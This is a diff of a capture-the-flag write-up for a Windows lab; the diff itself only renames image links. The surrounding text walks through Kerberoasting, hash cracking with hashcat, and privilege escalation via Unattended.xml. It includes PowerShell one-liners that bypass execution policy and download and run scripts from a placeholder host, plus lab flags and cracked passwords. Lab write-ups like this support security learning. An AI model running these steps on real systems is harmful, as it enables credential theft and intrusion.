@@ -57,12 +57,12 @@ Just like Linux bash, Windows Powershell saves all previous commands into a file
 Access the file and obtain the flag.
 flag{a12a41b5f8111327690f836e9b302f0b}
 
-![ConsoleHost_history](ConsoleHost_history.png)
+![ConsoleHost_history](consolehost-history.png)
 
 
 ## **Kerberoasting**
 
-![Kerberos](Kerberos.png)
+![Kerberos](kerberos-2.png)
 
 
 
@@ -76,7 +76,7 @@ SPN is the Service Principal Name, and is the mapping between service and accoun
 
 Running that command, we find an existing SPN. What user is that for?
 
-![kerberoasting spn](kerberoasting spn.png)
+![kerberoasting spn](kerberoasting-spn.png)
 ![fela](fela.png)
 
 
@@ -87,13 +87,13 @@ Lets first download the Powershell [Invoke-Kerberoast](https://raw.githubuserco
 `powershell -ep bypass;`  
 `iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Kerberoast.ps1')` 
 
-![downlad kerberoast](downlad kerberoast.png)
+![downlad kerberoast](downlad-kerberoast.png)
 
 Now lets load this into memory: `Invoke-Kerberoast -OutputFormat hashcat ​ |fl`
 
 You should get a SPN ticket.
 
-![Invoke-Kerberoast to dump the hash](Invoke-Kerberoast to dump the hash.png)
+![Invoke-Kerberoast to dump the hash](invoke-kerberoast-to-dump-the-hash.png)
 
 
 Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.
@@ -103,14 +103,14 @@ Lets use hashcat to bruteforce this password. The type of hash we're cracking is
 Crack the hash. What is the users password in plain text?  
 rubenF124
 
-![kerberos hash](kerberos hash.png)
+![kerberos hash](kerberos-hash.png)
 ![cracked](cracked.png)
 
 
 Login as this user. What is his flag?
 flag{bde1642535aa396d2439d86fe54a36e4}
 
-![flag user fela](flag user fela.png)
+![flag user fela](flag-user-fela.png)
 
 
 ## **Privilege Escalation**
@@ -126,7 +126,7 @@ We will run [PowerUp1.ps1](https://raw.githubusercontent.com/PowerShellEmpire/P
 `powershell -ep bypass;`  
 `iex​(New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1')`   
 
-![upload powerup1](upload powerup1.png)
+![upload powerup1](upload-powerup1.png)
 
 The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.
 
@@ -134,11 +134,11 @@ The script has identified several ways to get Administrator access. The first be
 
 It is also where users passwords are stored in base64 encoding. Navigate to `C:\Windows\Panther\Unattend\Unattended.xml.`
 
-![decoded password admin](decoded password admin.png)
+![decoded password admin](decoded-password-admin.png)
 
 ![password](password.png)
 ![rdp](rdp.png)
-![admin flag](admin flag.png)
+![admin flag](admin-flag.png)
 
 What is the decoded password?
 tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T 
